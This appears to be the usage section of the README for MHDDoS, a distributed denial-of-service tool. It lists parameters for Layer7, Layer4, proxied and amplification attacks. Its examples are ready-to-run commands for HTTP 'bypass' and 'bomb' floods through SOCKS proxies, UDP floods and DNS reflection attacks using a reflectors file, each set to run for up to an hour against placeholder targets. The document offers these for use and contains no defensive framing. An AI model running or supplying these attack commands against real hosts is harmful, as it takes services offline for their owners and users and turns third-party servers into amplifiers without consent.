## Parameters
* Layer7:
  - 1: Method (type of attack)
  - 2: Target URL or IP Address
  - 3: Proxy Version ([Proxy Usage](https://github.com/MHProDev/MHDDoS/wiki/Proxy-Support-!))
  - 5: Proxy File ([Proxy File Format](https://github.com/MHProDev/MHDDoS/wiki/Proxy-Files-Format))
  - 4: Number of threads to use ([Multi Threading](https://github.com/MHProDev/MHDDoS/wiki/Multithreading))
  - 5: RPC (Requests pre connection)
  - 6: Duration (Time to finish attack in seconds)
  - 7: Debug Mode (Optional)

* Layer4 Noraml:
  - 1: Method (type of attack)
  - 2: Target URL or IP Address
  - 3: Number of threads to use ([Multi Threading](https://github.com/MHProDev/MHDDoS/wiki/Multithreading))
  - 4: Duration (Time to finish attack in seconds)
  - 5: Debug Mode (Optional - [What is debug mode](https://github.com/MHProDev/MHDDoS/wiki/what-is-debug-mode))

* Layer4 Proxied:
  - 1: Method (type of attack)
  - 2: Target URL or IP Address
  - 3: Number of threads to use ([Multi Threading](https://github.com/MHProDev/MHDDoS/wiki/Multithreading))
  - 4: Duration (Time to finish attack in seconds)
  - 5: Proxy Version ([Proxy Usage](https://github.com/MHProDev/MHDDoS/wiki/Proxy-Support-!))
  - 6: Proxy File ([Proxy File Format](https://github.com/MHProDev/MHDDoS/wiki/Proxy-Files-Format))
  - 7: Debug Mode (Optional)

* Layer4 Amplification:
  - 1: Method (type of attack)
  - 2: Target URL or IP Address
  - 3: Number of threads to use ([Multi Threading](https://github.com/MHProDev/MHDDoS/wiki/Multithreading))
  - 4: Duration (Time to finish attack in seconds)
  - 5: Reflectors File ([Reflectors File](https://github.com/MHProDev/MHDDoS/wiki/Reflectors-file-usage))
  - 6: Debug Mode (Optional)


## Examples
* Layer7 (Website):
```shell script
# Running bypass attack from 101 threads, 
# with socks 5, 100 requests per proxy (connection), for 3600 seconds  
python start.py bypass https://example.com 5 101 socks5.txt 100 3600
# Running bomb attack from 50 threads (be careful must be < 300)
# with all proxies (0), 100 requests per proxy (connection), for 3600 seconds
python start.py bomb https://example.com 0 50 proxy.txt 100 3600
```

* Layer4 (Server/Home):
```shell script
# Running udp attack from 1 threads, for 3600 seconds  
python start.py udp 1.1.1.1:53 1 3600
# Running dns attack from 100 threads, for 3600 seconds  
# with reflector servers from dns.txt, for 3600 seconds  
python start.py dns 1.1.1.1:53 100 3600 dns.txt
# Running dns attack from 1000 threads
# with socks 5, for 3600 seconds  
python start.py minecraft 1.1.1.1:53 1000 3600 5 socks5.txt
```

* Debug Mode (Log Attack status):
```shell script
python start.py bypass https://example.com 5 1000 socks5.txt 100 100 true
python start.py udp 1.1.1.1:53 1 100 true
python start.py dns 1.1.1.1:53 1 100 dns.txt true
python start.py minecraft 1.1.1.1:53 1 100 5 socks5.txt true
```

* Tools/Help:
```shell script
python start.py tools
python start.py help
```